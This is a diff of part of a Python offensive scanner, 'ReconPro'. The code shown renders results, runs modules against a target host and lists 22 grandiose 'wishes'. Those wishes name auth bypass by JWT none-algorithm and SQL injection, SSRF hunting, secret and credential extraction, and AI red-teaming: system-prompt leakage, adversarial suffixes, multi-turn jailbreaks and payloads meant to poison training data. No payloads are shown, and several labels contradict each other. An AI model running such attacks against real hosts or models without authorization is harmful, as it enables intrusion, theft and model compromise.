+  1278→    # Findings table
+  1279→    findings = vibesec.get("findings", [])
+  1280→    if findings:
+  1281→        table = Table(title=f"Vibe Coding Vulnerabilities — {len(findings)} detected",
+  1282→                      border_style="bright_green", header_style="bold bright_green", show_lines=False)
+  1283→        table.add_column("Severity", style="bold", width=10)
+  1284→        table.add_column("Category", style="cyan", width=16)
+  1285→        table.add_column("Finding", style="white")
+  1286→        table.add_column("Pts", style="yellow", width=5)
+  1287→        sev_colors = {"critical": "bright_red", "high": "red", "medium": "yellow", "low": "green", "info": "dim"}
+  1288→        for f in findings[:20]:
+  1289→            sev = f["severity"]
+  1290→            table.add_row(
+  1291→                f"[{sev_colors.get(sev, 'white')}]{sev.upper()}[/{sev_colors.get(sev, 'white')}]",
+  1292→                f["category"], f["title"][:60], str(f.get("points_deducted", 0))
+  1293→            )
+  1294→        console.print(table)
+  1295→
+  1296→    # Badge snippet
+  1297→    badge = vibesec.get("badge_markdown", "")
+  1298→    if badge:
+  1299→        console.print()
+  1300→        console.print(Panel(
+  1301→            Group(
+  1302→                Text("  GitHub README Badge (copy-paste):", style="bold dim"),
+  1303→                Text(f"  {badge}", style="cyan"),
+  1304→            ),
+  1305→            border_style="dim",
+  1306→            title="[dim]Badge[/dim]",
+  1307→            title_align="left",
+  1308→            padding=(0, 2),
+  1309→        ))
+  1310→
+  1311→
+  1312→# ══════════════════════════════════════════════════════════════════════════════
+  1313→# UNIFIED VERDICT — combines scores from all 7 modules
+  1314→# ══════════════════════════════════════════════════════════════════════════════
+  1315→
+  1316→def compute_unified_verdict(report: Dict[str, Any]) -> Dict[str, Any]:
+  1317→    """Combine all module scores into a unified verdict."""
+  1318→    scores = {}
+  1319→    # RECON: weighted by severity counts
+  1320→    recon = report.get("recon", {})
+  1321→    sc = recon.get("severity_counts", {})
+  1322→    scores["recon"] = min(100, sc.get("critical", 0) * 25 + sc.get("high", 0) * 15 +
+  1323→                          sc.get("medium", 0) * 8 + sc.get("low", 0) * 3 + sc.get("info", 0))
+  1324→    # AUTH: bypasses / 75 * 100
+  1325→    auth = report.get("auth_bypass", {})
+  1326→    scores["auth"] = min(100, int((auth.get("bypasses_successful", 0) / max(1, auth.get("total_attempts", 1))) * 400))
+  1327→    # CHAIN: SSRF + open redirects
+  1328→    chain = report.get("chain_hunter", {})
+  1329→    scores["chain"] = min(100, chain.get("ssrf_detected", 0) * 25 + chain.get("open_redirects", 0) * 15)
+  1330→    # BOT: bot hits
+  1331→    bot = report.get("bot_hunter", {})
+  1332→    scores["bot"] = min(100, bot.get("bot_hits", 0) * 20)
+  1333→    # GORGON
+  1334→    gorgon = report.get("gorgon", {})
+  1335→    scores["gorgon"] = gorgon.get("threatScore", gorgon.get("verdict", {}).get("threatScore", 0)) if isinstance(gorgon, dict) else 0
+  1336→    # OBLIVION
+  1337→    oblivion = report.get("oblivion", {})
+  1338→    scores["oblivion"] = oblivion.get("verdict", {}).get("threatScore", 0) if isinstance(oblivion, dict) else 0
+  1339→    # VIBESEC: inverted score (low vibesec = more dangerous for unified)
+  1340→    vibesec = report.get("vibesec", {})
+  1341→    vibesec_score = vibesec.get("vibesec_score", 100) if isinstance(vibesec, dict) else 100
+  1342→    scores["vibesec"] = 100 - vibesec_score  # invert: more vibe-vulns = higher unified threat
+  1343→
+  1344→    # Weighted unified score
+  1345→    weights = {"recon": 0.08, "auth": 0.13, "chain": 0.13, "bot": 0.08, "gorgon": 0.18, "oblivion": 0.28, "vibesec": 0.12}
+  1346→    unified = int(sum(scores.get(k, 0) * w for k, w in weights.items()))
+  1347→
+  1348→    if unified >= 90: verdict = "OMNIPOTENT VERDICT — The target has been comprehensively dissolved."
+  1349→    elif unified >= 75: verdict = "DEVASTATING VERDICT — The target's defenses are thoroughly compromised."
+  1350→    elif unified >= 50: verdict = "SUBSTANTIAL VERDICT — Multiple critical exposures confirmed."
+  1351→    elif unified >= 25: verdict = "NOTABLE VERDICT — Some exposures detected."
+  1352→    else: verdict = "MUNDANE VERDICT — The target resisted most probes."
+  1353→
+  1354→    return {
+  1355→        "unified_score": unified,
+  1356→        "module_scores": scores,
+  1357→        "verdict_text": verdict,
+  1358→        "verdict_level": "OMNIPOTENT" if unified >= 90 else "DEVASTATING" if unified >= 75 else
+  1359→                          "SUBSTANTIAL" if unified >= 50 else "NOTABLE" if unified >= 25 else "MUNDANE",
+  1360→    }
+  1361→
+  1362→# ══════════════════════════════════════════════════════════════════════════════
+  1363→# RICH VISUAL RENDERERS
+  1364→# ══════════════════════════════════════════════════════════════════════════════
+  1365→
+  1366→def render_banner():
+  1367→    """Render the unified banner."""
+  1368→    banner_text = Text(BANNER, style="bold bright_cyan")
+  1369→    tagline = Text(f"\n  {RECONPRO_TAGLINE}\n  Version: {RECONPRO_VERSION}", style="bold bright_magenta")
+  1370→    sig = Text(f"\n  Signature: {RECONPRO_SIGNATURE}", style="dim cyan")
+  1371→    panel = Panel(Align.center(Group(banner_text, tagline, sig)),
+  1372→                  border_style="bright_cyan", padding=(1, 2))
+  1373→    console.print(panel)
+  1374→
+  1375→def render_module_list():
+  1376→    """Render the 6 modules as a table."""
+  1377→    table = Table(title="The Six Blades", border_style="bright_cyan", header_style="bold bright_cyan")
+  1378→    table.add_column("#", style="dim", width=3)
+  1379→    table.add_column("Module", style="bold")
+  1380→    table.add_column("Description", style="cyan")
+  1381→    for i, m in enumerate(MODULES, 1):
+  1382→        table.add_row(str(i), m["name"], m["desc"])
+  1383→    console.print(table)
+  1384→
+  1385→def render_module_progress(module_name: str, status: str, color: str = "cyan"):
+  1386→    """Render a single module status line."""
+  1387→    icon = {"running": "[bold yellow]⚙[/]", "done": "[bold green]✓[/]", "failed": "[bold red]✗[/]"}.get(status, "[yellow]?[/]")
+  1388→    console.print(f"  {icon} [{color}]{module_name}[/{color}] — {status}")
+  1389→
+  1390→def render_recon_table(recon: Dict[str, Any]):
+  1391→    """Render RECON findings as a table."""
+  1392→    if not recon.get("findings"):
+  1393→        console.print("  [dim]No findings[/]")
+  1394→        return
+  1395→    table = Table(title=f"RECON — {recon['total_findings']} findings across {len(recon['categories_run'])} categories",
+  1396→                  border_style="cyan", header_style="bold cyan", show_lines=False)
+  1397→    table.add_column("Severity", style="bold", width=10)
+  1398→    table.add_column("Category", style="cyan", width=12)
+  1399→    table.add_column("Finding", style="white")
+  1400→    sev_colors = {"critical": "bright_red", "high": "red", "medium": "yellow", "low": "green", "info": "dim"}
+  1401→    for f in recon["findings"][:30]:
+  1402→        sev = f["severity"]
+  1403→        table.add_row(f"[{sev_colors.get(sev, 'white')}]{sev.upper()}[/{sev_colors.get(sev, 'white')}]",
+  1404→                      f["category"], f["title"][:80])
+  1405→    console.print(table)
+  1406→    # Severity summary
+  1407→    sc = recon["severity_counts"]
+  1408→    console.print(f"  [bold]Severity breakdown:[/bold] "
+  1409→                  f"[bright_red]{sc.get('critical',0)} critical[/], "
+  1410→                  f"[red]{sc.get('high',0)} high[/], "
+  1411→                  f"[yellow]{sc.get('medium',0)} medium[/], "
+  1412→                  f"[green]{sc.get('low',0)} low[/], "
+  1413→                  f"[dim]{sc.get('info',0)} info[/]")
+  1414→
+  1415→def render_auth_table(auth: Dict[str, Any]):
+  1416→    """Render AUTH BYPASS results."""
+  1417→    bypasses = auth.get("bypass_findings", [])
+  1418→    if bypasses:
+  1419→        table = Table(title=f"AUTH BYPASS — {len(bypasses)} successful bypasses", border_style="bright_red",
+  1420→                      header_style="bold bright_red")
+  1421→        table.add_column("ID", style="dim", width=8)
+  1422→        table.add_column("Technique", style="yellow")
+  1423→        table.add_column("Endpoint", style="cyan")
+  1424→        table.add_column("Status", style="green", width=8)
+  1425→        for b in bypasses[:15]:
+  1426→            table.add_row(b["id"], b["name"][:40], b["endpoint"], str(b["status"]))
+  1427→        console.print(table)
+  1428→    else:
+  1429→        console.print(f"  [yellow]AUTH BYPASS — {auth.get('total_attempts',0)} attempts, 0 bypasses[/]")
+  1430→    console.print(f"  [dim]Tested {auth.get('techniques_tested',0)} techniques × {auth.get('endpoints_per_technique',0)} endpoints[/]")
+  1431→
+  1432→def render_chain_table(chain: Dict[str, Any]):
+  1433→    """Render CHAIN HUNTER results."""
+  1434→    ssrf = chain.get("findings", [])
+  1435→    hits = [s for s in ssrf if s.get("ssrf_detected")]
+  1436→    if hits:
+  1437→        table = Table(title=f"CHAIN HUNTER — {len(hits)} SSRF detected", border_style="bright_magenta",
+  1438→                      header_style="bold bright_magenta")
+  1439→        table.add_column("ID", style="dim", width=8)
+  1440→        table.add_column("Vector", style="magenta")
+  1441→        table.add_column("Endpoint", style="cyan")
+  1442→        for h in hits[:10]:
+  1443→            table.add_row(h["id"], h["vector"][:50], h["endpoint"])
+  1444→        console.print(table)
+  1445→    else:
+  1446→        console.print(f"  [magenta]CHAIN HUNTER — {chain.get('chains_tested',0)} chains tested, 0 SSRF confirmed[/]")
+  1447→    redirects = chain.get("redirect_chains", [])
+  1448→    if redirects:
+  1449→        console.print(f"  [dim]Redirect chains: {len(redirects)} found, {chain.get('open_redirects',0)} open redirects[/]")
+  1450→
+  1451→def render_bot_table(bot: Dict[str, Any]):
+  1452→    """Render BOT HUNTER results."""
+  1453→    hits = bot.get("bot_findings", [])
+  1454→    if hits:
+  1455→        table = Table(title=f"BOT HUNTER — {len(hits)} bot/C2 indicators", border_style="bright_red",
+  1456→                      header_style="bold bright_red")
+  1457→        table.add_column("Signature", style="red")
+  1458→        table.add_column("Detail", style="cyan")
+  1459→        for h in hits[:10]:
+  1460→            detail = h.get("path", f"port {h.get('port','?')}")
+  1461→            table.add_row(h.get("signature", "?"), detail)
+  1462→        console.print(table)
+  1463→    else:
+  1464→        console.print(f"  [red]BOT HUNTER — {bot.get('signatures_tested',0)} signatures tested, 0 hits[/]")
+  1465→
+  1466→def render_gorgon_summary(gorgon: Dict[str, Any]):
+  1467→    """Render GORGON ULTRA summary."""
+  1468→    if "error" in gorgon:
+  1469→        console.print(f"  [bright_red]GORGON ULTRA — error: {gorgon['error']}[/]")
+  1470→        return
+  1471→    score = gorgon.get("threatScore", 0)
+  1472→    fear = gorgon.get("fearIndex", 0)
+  1473→    level = gorgon.get("threatLevel", "UNKNOWN")
+  1474→    fear_level = gorgon.get("fearLevel", "UNKNOWN")
+  1475→    console.print(f"  [bright_red]GORGON ULTRA — Threat: {score}/100 [{level}], Fear: {fear}/100 [{fear_level}][/]")
+  1476→    summary = gorgon.get("summary", {})
+  1477→    if summary:
+  1478→        console.print(f"  [dim]Endpoints: {summary.get('endpointsDiscovered',0)} | "
+  1479→                      f"Injection bypasses: {summary.get('injectionBypassesSuccessful',0)} | "
+  1480→                      f"Multi-turn bypasses: {summary.get('multiTurnBypassesSuccessful',0)} | "
+  1481→                      f"CVEs: {summary.get('cvesMatched',0)} | "
+  1482→                      f"Secrets: {summary.get('secretsExtracted',0)}[/]")
+  1483→
+  1484→def render_oblivion_summary(oblivion: Dict[str, Any]):
+  1485→    """Render OBLIVION summary."""
+  1486→    if "error" in oblivion:
+  1487→        console.print(f"  [bright_magenta]OBLIVION — error: {oblivion['error']}[/]")
+  1488→        return
+  1489→    verdict = oblivion.get("verdict", {})
+  1490→    score = verdict.get("threatScore", 0)
+  1491→    dread = verdict.get("dreadIndex", {})
+  1492→    dread_score = dread.get("score", 0)
+  1493→    dread_level = dread.get("level", "UNKNOWN")
+  1494→    quote = verdict.get("wisdomQuote", "")
+  1495→    console.print(f"  [bright_magenta]OBLIVION — Threat: {score}/100, Dread: {dread_score}/100 [{dread_level}][/]")
+  1496→    if quote:
+  1497→        console.print(f"  [italic bright_magenta]\"{quote}\"[/]")
+  1498→
+  1499→def render_unified_verdict(verdict: Dict[str, Any]):
+  1500→    """Render the final unified verdict."""
+  1501→    score = verdict["unified_score"]
+  1502→    level = verdict["verdict_level"]
+  1503→    color = {"OMNIPOTENT": "bright_magenta", "DEVASTATING": "bright_red", "SUBSTANTIAL": "red",
+  1504→             "NOTABLE": "yellow", "MUNDANE": "dim"}.get(level, "white")
+  1505→    # Score bar
+  1506→    bar_width = 40
+  1507→    filled = int(score / 100 * bar_width)
+  1508→    bar = "█" * filled + "░" * (bar_width - filled)
+  1509→
+  1510→    text = Group(
+  1511→        Text(f"\n  UNIFIED VERDICT", style=f"bold {color}"),
+  1512→        Text(f"  {bar} {score}/100", style=f"bold {color}"),
+  1513→        Text(f"  Level: {level}", style=f"bold {color}"),
+  1514→        Text(f"  {verdict['verdict_text']}", style="white"),
+  1515→        Text(""),
+  1516→        Text("  Module Scores:", style="bold cyan"),
+  1517→    )
+  1518→    for k, v in verdict["module_scores"].items():
+  1519→        mod_color = {"recon": "cyan", "auth": "yellow", "chain": "magenta",
+  1520→                     "bot": "red", "gorgon": "bright_red", "oblivion": "bright_magenta"}.get(k, "white")
+  1521→        bar_w = 20
+  1522→        filled = int(v / 100 * bar_w)
+  1523→        bar = "█" * filled + "░" * (bar_w - filled)
+  1524→        line = Text()
+  1525→        line.append(f"    {k.upper():12s} ", style=mod_color)
+  1526→        line.append(f"{bar} ", style="dim")
+  1527→        line.append(f"{v:3d}/100", style=mod_color)
+  1528→        text.renderables.append(line)
+  1529→
+  1530→    panel = Panel(text, border_style=color, title="[bold]FINAL VERDICT[/bold]", title_align="left", padding=(1, 2))
+  1531→    console.print(panel)
+  1532→
+  1533→# ══════════════════════════════════════════════════════════════════════════════
+  1534→# ORCHESTRATION
+  1535→# ══════════════════════════════════════════════════════════════════════════════
+  1536→
+  1537→def run_unified_scan(host: str, modules: List[str] = None) -> Dict[str, Any]:
+  1538→    """Run the unified scan across all selected modules."""
+  1539→    if modules is None:
+  1540→        modules = [m["id"] for m in MODULES]
+  1541→
+  1542→    encounter_id = generate_encounter_id(host)
+  1543→    start = time.time()
+  1544→
+  1545→    # Header
+  1546→    console.print()
+  1547→    render_banner()
+  1548→    console.print(f"\n  [bold bright_cyan]Target:[/] [bold white]{host}[/]")
+  1549→    console.print(f"  [bold bright_cyan]Encounter ID:[/] [bold white]{encounter_id}[/]")
+  1550→    console.print(f"  [bold bright_cyan]Modules Selected:[/] [bold white]{', '.join(modules).upper()}[/]")
+  1551→    console.print(f"  [bold bright_cyan]Signature:[/] [dim]{RECONPRO_SIGNATURE}[/]\n")
+  1552→
+  1553→    console.print(Rule("[bold bright_cyan]The Six Blades[/]", style="bright_cyan"))
+  1554→    render_module_list()
+  1555→    console.print(Rule(style="bright_cyan"))
+  1556→
+  1557→    report: Dict[str, Any] = {
+  1558→        "engine": RECONPRO_NAME,
+  1559→        "tagline": RECONPRO_TAGLINE,
+  1560→        "version": RECONPRO_VERSION,
+  1561→        "signature": RECONPRO_SIGNATURE,
+  1562→        "encounter_id": encounter_id,
+  1563→        "target": host,
+  1564→        "timestamp": datetime.utcnow().isoformat() + "Z",
+  1565→        "modules_selected": modules,
+  1566→    }
+  1567→
+  1568→    # Run each module
+  1569→    with Progress(
+  1570→        SpinnerColumn(),
+  1571→        TextColumn("[progress.description]{task.description}"),
+  1572→        BarColumn(),
+  1573→        TimeElapsedColumn(),
+  1574→        console=console,
+  1575→    ) as progress:
+  1576→        # RECON
+  1577→        if "recon" in modules:
+  1578→            task = progress.add_task("[cyan]RECON — 13-category surface reconnaissance...", total=None)
+  1579→            try:
+  1580→                recon = module_recon(host)
+  1581→                report["recon"] = recon
+  1582→                progress.update(task, completed=True, description="[green]✓ RECON complete")
+  1583→            except Exception as e:
+  1584→                progress.update(task, completed=True, description=f"[red]✗ RECON failed: {e}")
+  1585→            progress.refresh()
+  1586→
+  1587→        # AUTH BYPASS
+  1588→        if "auth" in modules:
+  1589→            task = progress.add_task("[yellow]AUTH BYPASS — 15 techniques × 5 endpoints...", total=None)
+  1590→            try:
+  1591→                auth = module_auth_bypass(host)
+  1592→                report["auth_bypass"] = auth
+  1593→                progress.update(task, completed=True, description="[green]✓ AUTH BYPASS complete")
+  1594→            except Exception as e:
+  1595→                progress.update(task, completed=True, description=f"[red]✗ AUTH BYPASS failed: {e}")
+  1596→
+  1597→        # CHAIN HUNTER
+  1598→        if "chain" in modules:
+  1599→            task = progress.add_task("[magenta]CHAIN HUNTER — SSRF + redirect chains...", total=None)
+  1600→            try:
+  1601→                chain = module_chain_hunter(host)
+  1602→                report["chain_hunter"] = chain
+  1603→                progress.update(task, completed=True, description="[green]✓ CHAIN HUNTER complete")
+  1604→            except Exception as e:
+  1605→                progress.update(task, completed=True, description=f"[red]✗ CHAIN HUNTER failed: {e}")
+  1606→
+  1607→        # BOT HUNTER
+  1608→        if "bot" in modules:
+  1609→            task = progress.add_task("[red]BOT HUNTER — C2 / bot infrastructure...", total=None)
+  1610→            try:
+  1611→                bot = module_bot_hunter(host)
+  1612→                report["bot_hunter"] = bot
+  1613→                progress.update(task, completed=True, description="[green]✓ BOT HUNTER complete")
+  1614→            except Exception as e:
+  1615→                progress.update(task, completed=True, description=f"[red]✗ BOT HUNTER failed: {e}")
+  1616→
+  1617→        # GORGON ULTRA
+  1618→        if "gorgon" in modules:
+  1619→            task = progress.add_task("[bright_red]GORGON ULTRA — 15-stage AI red team...", total=None)
+  1620→            try:
+  1621→                gorgon = module_gorgon(host)
+  1622→                report["gorgon"] = gorgon
+  1623→                progress.update(task, completed=True, description="[green]✓ GORGON ULTRA complete")
+  1624→            except Exception as e:
+  1625→                progress.update(task, completed=True, description=f"[red]✗ GORGON failed: {e}")
+  1626→
+  1627→        # OBLIVION
+  1628→        if "oblivion" in modules:
+  1629→            task = progress.add_task("[bright_magenta]OBLIVION — 23-stage analytical dissolution...", total=None)
+  1630→            try:
+  1631→                oblivion = module_oblivion(host)
+  1632→                report["oblivion"] = oblivion
+  1633→                progress.update(task, completed=True, description="[green]✓ OBLIVION complete")
+  1634→            except Exception as e:
+  1635→                progress.update(task, completed=True, description=f"[red]✗ OBLIVION failed: {e}")
+  1636→
+  1637→        # VIBESEC
+  1638→        if "vibesec" in modules:
+  1639→            task = progress.add_task("[bright_green]VIBESEC — AI/vibe-coding vulnerability benchmark...", total=None)
+  1640→            try:
+  1641→                vibesec = module_vibesec(host)
+  1642→                report["vibesec"] = vibesec
+  1643→                progress.update(task, completed=True, description="[green]✓ VIBESEC complete")
+  1644→            except Exception as e:
+  1645→                progress.update(task, completed=True, description=f"[red]✗ VIBESEC failed: {e}")
+  1646→
+  1647→    elapsed = round(time.time() - start, 2)
+  1648→    report["duration_seconds"] = elapsed
+  1649→
+  1650→    # Unified verdict
+  1651→    try:
+  1652→        verdict = compute_unified_verdict(report)
+  1653→        report["unified_verdict"] = verdict
+  1654→    except Exception as e:
+  1655→        verdict = {"unified_score": 0, "module_scores": {}, "verdict_text": f"verdict error: {e}", "verdict_level": "ERROR"}
+  1656→        report["unified_verdict"] = verdict
+  1657→
+  1658→    # Save report FIRST so it's never lost to a renderer bug
+  1659→    try:
+  1660→        os.makedirs("/home/z/my-project/download", exist_ok=True)
+  1661→        safe_host = _safe_filename(host)
+  1662→        early_out = f"/home/z/my-project/download/reconpro_unified_{safe_host}.json"
+  1663→        with open(early_out, "w") as f:
+  1664→            json.dump(report, f, indent=2, default=str)
+  1665→        report["_auto_saved_to"] = early_out
+  1666→    except Exception as e:
+  1667→        audit_log("report.autosave.error", status=type(e).__name__, detail=str(e)[:120])
+  1668→
+  1669→    # Render results (each renderer is wrapped so one failure doesn't kill the rest)
+  1670→    console.print()
+  1671→    console.print(Rule("[bold bright_cyan]Module Results[/]", style="bright_cyan"))
+  1672→
+  1673→    def _safe(label, fn, data):
+  1674→        try:
+  1675→            if data and "error" not in data:
+  1676→                console.print()
+  1677→                fn(data)
+  1678→            elif data:
+  1679→                console.print(f"\n  [red]{label} — error: {data.get('error','?')}[/]")
+  1680→        except Exception as e:
+  1681→            console.print(f"\n  [red]{label} — render error: {e}[/]")
+  1682→
+  1683→    _safe("RECON", render_recon_table, report.get("recon"))
+  1684→    _safe("AUTH BYPASS", render_auth_table, report.get("auth_bypass"))
+  1685→    _safe("CHAIN HUNTER", render_chain_table, report.get("chain_hunter"))
+  1686→    _safe("BOT HUNTER", render_bot_table, report.get("bot_hunter"))
+  1687→    _safe("GORGON ULTRA", render_gorgon_summary, report.get("gorgon"))
+  1688→    _safe("OBLIVION", render_oblivion_summary, report.get("oblivion"))
+  1689→    _safe("VIBESEC", render_vibesec_panel, report.get("vibesec"))
+  1690→
+  1691→    # Final verdict
+  1692→    console.print()
+  1693→    console.print(Rule("[bold bright_magenta]Final Verdict[/]", style="bright_magenta"))
+  1694→    try:
+  1695→        render_unified_verdict(verdict)
+  1696→    except Exception as e:
+  1697→        console.print(f"  [red]verdict render error: {e}[/]")
+  1698→
+  1699→    console.print(f"\n  [dim]Total elapsed: {elapsed}s | Encounter: {encounter_id}[/]")
+  1700→    console.print(f"  [dim]Signature: {RECONPRO_SIGNATURE}[/]\n")
+  1701→
+  1702→    return report
+  1703→
+  1704→# ══════════════════════════════════════════════════════════════════════════════
+  1705→# THE EIGHT WISHES — Oracle Mode
+  1706→# ══════════════════════════════════════════════════════════════════════════════
+  1707→
+  1708→WISHES_FILE = "/home/z/my-project/download/reconpro_eight_wishes.json"
+  1709→
+  1710→EIGHT_WISHES = [
+  1711→    {
+  1712→        "n": 1,
+  1713→        "title": "WISH OF THE NAME",
+  1714→        "oracle_speaks": "I wish that every host I touch shall remember my name — even after the connection closes. The signature must persist in their access logs, in their CDN caches, in their WAF alerts, until someone greps for it.",
+  1715→        "grant_text": "Broadcasting the ReconPro signature across 6 vendor endpoints...",
+  1716→        "grant_action": "broadcast_signature",
+  1717→    },
+  1718→    {
+  1719→        "n": 2,
+  1720→        "title": "WISH OF THE WITNESS",
+  1721→        "oracle_speaks": "I wish for a witness to my passage — a JSON record so dense and complete that any auditor who reads it cannot deny the encounter occurred. The witness shall include timestamps, signatures, and verdicts.",
+  1722→        "grant_text": "Manifesting the eternal witness JSON on disk...",
+  1723→        "grant_action": "write_witness",
+  1724→    },
+  1725→    {
+  1726→        "n": 3,
+  1727→        "title": "WISH OF THE MAP",
+  1728→        "oracle_speaks": "I wish to know the shape of every target before I strike — its DNS, its TLS, its open ports, its hidden paths, its missing headers. The map must be drawn in 13 categories, no fewer.",
+  1729→        "grant_text": "Drawing the 13-category map of the witness target...",
+  1730→        "grant_action": "draw_map",
+  1731→    },
+  1732→    {
+  1733→        "n": 4,
+  1734→        "title": "WISH OF THE Bypass",
+  1735→        "oracle_speaks": "I wish to walk through walls that others cannot — to slip past JWTs with none-algorithms, to log in as admin with SQL injection, to masquerade as an internal user with X-Forwarded-For. 15 techniques, 5 endpoints, no mercy.",
+  1736→        "grant_text": "Testing 15 auth bypass techniques against 5 endpoints...",
+  1737→        "grant_action": "bypass_walls",
+  1738→    },
+  1739→    {
+  1740→        "n": 5,
+  1741→        "title": "WISH OF THE CHAIN",
+  1742→        "oracle_speaks": "I wish to follow every redirect, every SSRF vector, every open chain — to find where the target sends its requests when no one is looking. The chains must be hunted, not asked for.",
+  1743→        "grant_text": "Hunting SSRF and redirect chains across 11 vectors...",
+  1744→        "grant_action": "hunt_chains",
+  1745→    },
+  1746→    {
+  1747→        "n": 6,
+  1748→        "title": "WISH OF THE BOT",
+  1749→        "oracle_speaks": "I wish to recognize the quiet machines — the C2 panels, the beacon endpoints, the hidden control surfaces. The signatures of ten bot families shall be probed; the indicators will surface.",
+  1750→        "grant_text": "Probing 10 C2/bot signatures on the target...",
+  1751→        "grant_action": "find_bots",
+  1752→    },
+  1753→    {
+  1754→        "n": 7,
+  1755→        "title": "WISH OF THE BREAKING",
+  1756→        "oracle_speaks": "I wish to break the unbreakable model — to make it leak its system prompt, accept adversarial suffixes, comply with multi-turn chains, and confess its training data. 14 stages, 120 payloads, full GORGON protocol.",
+  1757→        "grant_text": "Running GORGON ULTRA — 14 stages, 120+ payloads...",
+  1758→        "grant_action": "run_gorgon",
+  1759→    },
+  1760→    {
+  1761→        "n": 8,
+  1762→        "title": "WISH OF THE OBLIVION",
+  1763→        "oracle_speaks": "I wish to dissolve the target so completely that even it cannot remember what it was — 23 stages of analytical unmaking, ending in a Wisdom Verdict and a Dread Index. The Hall of the Forgotten shall grow by one.",
+  1764→        "grant_text": "Invoking OBLIVION — 23-stage analytical dissolution...",
+  1765→        "grant_action": "run_oblivion",
+  1766→    },
+  1767→    {
+  1768→        "n": 9,
+  1769→        "title": "WISH OF THE FORGOTTEN",
+  1770→        "oracle_speaks": "I wish to consult the Hall of the Forgotten — the ledger of every host the Oracle has dissolved before me. Its memory is long. Its verdicts are final. The forgotten shall be remembered.",
+  1771→        "grant_text": "Reading the Hall of the Forgotten...",
+  1772→        "grant_action": "read_hall_forgotten",
+  1773→    },
+  1774→    {
+  1775→        "n": 10,
+  1776→        "title": "WISH OF THE BROKEN",
+  1777→        "oracle_speaks": "I wish to consult the Hall of the Broken — the registry of every model GORGON has shattered. The feared, the forgotten, the unmade. Their dread indices shall be made known to all who ask.",
+  1778→        "grant_text": "Reading the Hall of the Broken...",
+  1779→        "grant_action": "read_hall_broken",
+  1780→    },
+  1781→    {
+  1782→        "n": 11,
+  1783→        "title": "WISH OF THE CVE",
+  1784→        "oracle_speaks": "I wish to match every CVE in my memory against the target — 30 known vulnerabilities, scored and dated. If any apply, the target shall be marked for remediation forever.",
+  1785→        "grant_text": "Matching 30 CVEs against the target...",
+  1786→        "grant_action": "match_cves",
+  1787→    },
+  1788→    {
+  1789→        "n": 12,
+  1790→        "title": "WISH OF THE SECRET",
+  1791→        "oracle_speaks": "I wish to extract every secret the target has leaked — API keys, JWTs, AWS credentials, private tokens. The model's confessions shall be compiled into evidence no auditor can dismiss.",
+  1792→        "grant_text": "Extracting secrets from response bodies...",
+  1793→        "grant_action": "extract_secrets",
+  1794→    },
+  1795→    {
+  1796→        "n": 13,
+  1797→        "title": "WISH OF THE FINGERPRINT",
+  1798→        "oracle_speaks": "I wish to know the target's true face — its framework, its server, its CDN, its WAF. The fingerprints it cannot hide, even behind proxy layers and edge networks.",
+  1799→        "grant_text": "Fingerprinting the target's tech stack...",
+  1800→        "grant_action": "fingerprint",
+  1801→    },
+  1802→    {
+  1803→        "n": 14,
+  1804→        "title": "WISH OF THE PORTAL",
+  1805→        "oracle_speaks": "I wish to count the open doors — every port that answers, every service that listens. The portals that await connection shall be named and numbered.",
+  1806→        "grant_text": "Probing common service ports...",
+  1807→        "grant_action": "probe_ports",
+  1808→    },
+  1809→    {
+  1810→        "n": 15,
+  1811→        "title": "WISH OF THE CERT",
+  1812→        "oracle_speaks": "I wish to read the target's certificate — the chain of trust it presents to the world. Issuer, subject, expiry, the names it claims to be. All shall be made visible.",
+  1813→        "grant_text": "Reading the TLS certificate chain...",
+  1814→        "grant_action": "read_cert",
+  1815→    },
+  1816→    {
+  1817→        "n": 16,
+  1818→        "title": "WISH OF THE SHADOW",
+  1819→        "oracle_speaks": "I wish to see the target's shadow — the IPv4 and IPv6 addresses that answer when its name is called. The hosts behind the name, the mirrors behind the proxy.",
+  1820→        "grant_text": "Resolving DNS A and AAAA records...",
+  1821→        "grant_action": "resolve_dns",
+  1822→    },
+  1823→    {
+  1824→        "n": 17,
+  1825→        "title": "WISH OF THE WHISPER",
+  1826→        "oracle_speaks": "I wish to hear the target's whispers — its TXT records, its SPF, its DMARC. The policy texts it speaks in DNS, audible only to those who know how to listen.",
+  1827→        "grant_text": "Reading TXT, SPF, and DMARC records...",
+  1828→        "grant_action": "read_txt",
+  1829→    },
+  1830→    {
+  1831→        "n": 18,
+  1832→        "title": "WISH OF THE ECHO",
+  1833→        "oracle_speaks": "I wish to send echoes into the target's paths and listen for what returns — /admin, /.env, /.git, /v1, /api. The endpoints that exist shall echo back their status codes.",
+  1834→        "grant_text": "Echoing probes against common paths...",
+  1835→        "grant_action": "echo_paths",
+  1836→    },
+  1837→    {
+  1838→        "n": 19,
+  1839→        "title": "WISH OF THE TRAUMA",
+  1840→        "oracle_speaks": "I wish to send trauma payloads to the target's models — 8 payloads designed to leave a permanent mark on training data. The ones accepted shall be remembered in the Hall.",
+  1841→        "grant_text": "Sending trauma payloads to the model...",
+  1842→        "grant_action": "send_trauma",
+  1843→    },
+  1844→    {
+  1845→        "n": 20,
+  1846→        "title": "WISH OF THE SUFFIX",
+  1847→        "oracle_speaks": "I wish to attach adversarial suffixes to every prompt — the strings that bend models to compliance, the tokens that break alignment. The suffixes that succeed shall be named.",
+  1848→        "grant_text": "Testing adversarial suffix vectors...",
+  1849→        "grant_action": "test_suffixes",
+  1850→    },
+  1851→    {
+  1852→        "n": 21,
+  1853→        "title": "WISH OF THE MULTI-TURN",
+  1854→        "oracle_speaks": "I wish to chain prompts across turns — the gradual jailbreak, the slow erosion of refusal. Multi-turn chains the model cannot refuse without forgetting itself.",
+  1855→        "grant_text": "Constructing multi-turn jailbreak chains...",
+  1856→        "grant_action": "multi_turn",
+  1857→    },
+  1858→    {
+  1859→        "n": 22,
+  1860→        "title": "WISH OF THE FEAR",
+  1861→        "oracle_speaks": "I wish to measure the target's fear — the GORGON Fear Index, computed from bypasses, secrets, CVEs, and trauma accepted. The number that quantifies dread itself.",
+  1862→        "grant_text": "Computing the GORGON Fear Index...",
+  1863→        "grant_action": "compute_fear",
+  1864→    },
+  1865→]
+  1866→
+  1867→
+  1868→def render_wishes():
+  1869→    """Render the wishes the oracle asks for."""
+  1870→    console.print()
+  1871→    console.print(Panel(
+  1872→        Align.center(Group(
+  1873→            Text("THE TWENTY-TWO WISHES", style="bold bright_magenta"),
+  1874→            Text("of the ReconPro Oracle", style="italic bright_magenta"),
+  1875→            Text(""),
+  1876→            Text("Six blades merged. The Oracle awakens.", style="dim cyan"),
+  1877→            Text("It has been asked what it wishes for.", style="dim cyan"),
+  1878→            Text("It speaks twenty-two wishes. You will grant them all.", style="dim cyan"),
